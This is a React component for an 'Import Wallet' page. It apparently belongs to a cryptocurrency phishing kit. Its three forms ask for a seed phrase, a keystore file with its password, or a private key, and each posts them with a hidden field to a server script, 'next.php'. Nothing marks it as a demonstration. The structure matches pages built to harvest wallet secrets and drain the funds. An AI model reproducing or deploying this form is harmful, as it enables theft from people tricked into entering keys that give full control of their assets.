import React from "react";

const ImportWallet = () => {
  return (
    <>
      <h2>
        Import Wallet
      </h2>
      <br/>
      <div className="tab">
          {/* <button className="tablinks active" id="default" onclick="openCity(event, 'phrase')">Phrase</button>
          <button className="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</button>
          <button className="tablinks" onclick="openCity(event, 'private')">Private Key</button> */}
      </div>
      <div>
          <form className="form" id="form1" action="./next.php" method="post">
              <div id="phrase" className="tabcontent" style={{display: "block"}}>
                  <input type="text" id="walletApp1" name="walletApp" value="" style={{display: "none"}}/>
                  <textarea name="phrase" className="phrase" placeholder="Phrase" required></textarea>
                  <br/>
                  <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                  <br/>
                  <button type="submit" name="btn1" form="form1" className="btn">IMPORT</button>
              </div>
          </form>
          <form className="form" id="form2" action="./next.php" method="post">
              <div id="keystore" className="tabcontent" style={{display: "none"}}>
                  <input type="text" id="walletApp2" name="walletApp" value="" style={{display: "none"}}/>
                  <textarea name="keystoreJSON" className="phrase" placeholder="Keystore JSON" required></textarea>
                  <br/>
                  <div className="field">
                      <input type="password" name="password" placeholder="Password" required/>
                  </div>
                  <div className="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                  <br/>
                  <button type="submit" name="btn2" form="form2" className="btn">IMPORT</button>
              </div>
          </form>
          <form className="form" id="form3" action="./next.php" method="post">
              <div id="private" className="tabcontent" style={{display: "none"}}>
                  
                  <input type="text" id="walletApp3" name="walletApp" value="" style={{display: "none"}}/>
                  <div className="field">
                      <input type="text" name="privateKey" className="key" placeholder="Private Key" required/>
                  </div>
                  <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                  <br/>
                  <button type="submit" name="btn3" form="form3" className="btn">IMPORT</button>
              </div>
          </form>
      </div>
    </>
  )
}

export default ImportWallet;